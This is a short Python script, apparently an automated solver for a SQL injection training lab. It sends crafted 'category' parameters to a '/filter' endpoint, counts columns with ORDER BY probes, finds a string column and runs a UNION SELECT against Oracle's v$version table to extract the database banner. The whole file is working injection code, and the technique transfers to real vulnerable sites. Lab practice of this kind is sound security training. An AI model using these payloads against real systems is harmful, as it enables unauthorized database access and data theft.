from ...utils import *
from urllib.parse import urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/filter")

    print_info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} --"}
        resp = requests.get(url, params=params, proxies=proxies, verify=False)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    print_success(f"There are {num_columns} columns.\n")
    print_info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        # Construct columns string
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} FROM DUAL --"}
        resp = requests.get(url, params=params, proxies=proxies, verify=False)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        print_fail("Unable to find a column with the string data type")
    else:
        print_success(f"Column {i} has the string data type.\n")

    # Construct columns string
    columns = ["null"] * num_columns
    columns[i] = "banner"
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} FROM v$version --"}

    print_info(
        f'Performing UNION attack by visitng "{url}" with the following parameters:'
    )
    print(params)

    requests.get(url, params=params, proxies=proxies, verify=False)
    print_success("UNION attack performed.\n")
